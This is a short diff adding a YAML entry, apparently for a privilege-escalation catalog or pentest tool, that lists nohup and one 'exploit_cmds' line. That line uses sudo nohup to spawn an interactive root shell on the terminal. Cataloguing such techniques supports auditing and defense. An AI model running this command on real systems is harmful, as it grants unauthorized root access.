@@ -1,0 +1,4 @@
+name: nohup
+binary_path: /usr/bin/nohup
+exploit_cmds:
+- sudo /usr/bin/nohup /bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'
